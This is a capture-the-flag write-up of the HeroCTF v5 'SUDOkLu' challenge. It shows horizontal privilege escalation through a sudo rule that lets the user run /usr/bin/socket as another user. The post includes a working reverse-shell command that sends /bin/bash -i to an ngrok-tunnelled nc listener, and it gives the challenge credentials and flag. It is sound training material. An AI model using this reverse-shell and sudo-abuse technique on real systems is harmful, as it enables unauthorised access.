# SUDOkLu

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Conclusion](#conclusion)

## Overview

- 199 solves / 50 points
- Difficulty: Easy
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This is a warmup to get you going. Your task is to read `/home/privilegeduser/flag.txt`. For our new commers, the title might steer you in the right direction ;). Good luck!  
  
Credentials: `user:password123`  
  
> Deploy on [deploy.heroctf.fr](https://deploy.heroctf.fr/)  
  
Format : **Hero{flag}**  
Author : **Log_s**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513161445.png)

## Enumeration

**In this challenge, we can SSH into user `user`:**
```shell
┌[siunam♥earth]-(~/ctf/HeroCTF-v5/System/SUDOkLu)-[2023.05.13|16:15:23(HKT)]
└> ssh user@dyn-03.heroctf.fr -p 12297     
[...]
user@dyn-03.heroctf.fr's password: 
[...]
user@sudoklu:~$ whoami;hostname;id
user
sudoklu
uid=1000(user) gid=1000(user) groups=1000(user)
```

**In `/etc/passwd` and `/home` directory, there's a `privilegeduser`:**
```shell
user@sudoklu:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:,,,:/home/user:/bin/bash
privilegeduser:x:1001:1001:,,,:/home/privilegeduser:/bin/bash
user@sudoklu:~$ ls -lah /home
total 20K
drwxr-xr-x 1 root           root           4.0K May 12 10:35 .
drwxr-xr-x 1 root           root           4.0K May 13 08:15 ..
drwxr-x--- 1 privilegeduser privilegeduser 4.0K May 12 10:36 privilegeduser
drwxr-x--- 1 user           user           4.0K May 13 08:15 user
```

Our goal is to access `privilegeduser` home directory and read the flag.

**One of the common privilege escalation in Linux is Sudo permission:**
```shell
user@sudoklu:~$ sudo -l
Matching Defaults entries for user on sudoklu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User user may run the following commands on sudoklu:
    (privilegeduser) NOPASSWD: /usr/bin/socket
```

As you can see, user `privilegeduser` can run `/usr/bin/socket` **without password**.

**According to [GTFOBins](https://gtfobins.github.io/gtfobins/socket/), we can get a reverse shell!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513161815.png)

**To do so, we first fire up a port forwarding service, like Ngrok: (This is because the instance machine can't reach to our local network)**
```shell
┌[siunam♥earth]-(~/ctf/HeroCTF-v5/System/SUDOkLu)-[2023.05.13|16:19:27(HKT)]
└> ngrok tcp 4444
[...]
Forwarding                    tcp://0.tcp.ap.ngrok.io:18001 -> localhost:4444
[...]
```

**Then, setup a `nc` listener:**
```shell
┌[siunam♥earth]-(~/ctf/HeroCTF-v5/System/SUDOkLu)-[2023.05.13|16:19:39(HKT)]
└> nc -lnvp 4444
listening on [any] 4444 ...
```

**Finally, send the reverse shell payload:**
```shell
user@sudoklu:~$ sudo -u privilegeduser /usr/bin/socket -qvp '/bin/bash -i' 0.tcp.ap.ngrok.io 18001
inet: connected to 0.tcp.ap.ngrok.io port 18001
```

```shell
┌[siunam♥earth]-(~/ctf/HeroCTF-v5/System/SUDOkLu)-[2023.05.13|16:19:39(HKT)]
└> nc -lnvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 35586
privilegeduser@sudoklu:/home/user$ 
```

**Nice! We got a shell! Let's read the flag!**
```shell
privilegeduser@sudoklu:/home/user$ cd ~
cd ~
privilegeduser@sudoklu:~$ ls -lah
ls -lah
total 28K
drwxr-x--- 1 privilegeduser privilegeduser 4.0K May 12 10:36 .
drwxr-xr-x 1 root           root           4.0K May 12 10:35 ..
lrwxrwxrwx 1 root           root              9 May 12 10:36 .bash_history -> /dev/null
-rw-r--r-- 1 privilegeduser privilegeduser  220 May 12 10:35 .bash_logout
-rw-r--r-- 1 privilegeduser privilegeduser 3.7K May 12 10:35 .bashrc
-rw-r--r-- 1 privilegeduser privilegeduser  807 May 12 10:35 .profile
-r-------- 1 privilegeduser privilegeduser   34 May 12 10:36 flag.txt
privilegeduser@sudoklu:~$ cat flag.txt
cat flag.txt
Hero{ch3ck_f0r_m1sc0nf1gur4t1on5}
```

- **Flag: `Hero{ch3ck_f0r_m1sc0nf1gur4t1on5}`**

## Conclusion

What we've learned:

1. Horizontal Privilege Escalation Via Misconfigurated `/usr/bin/socket` Sudo Permission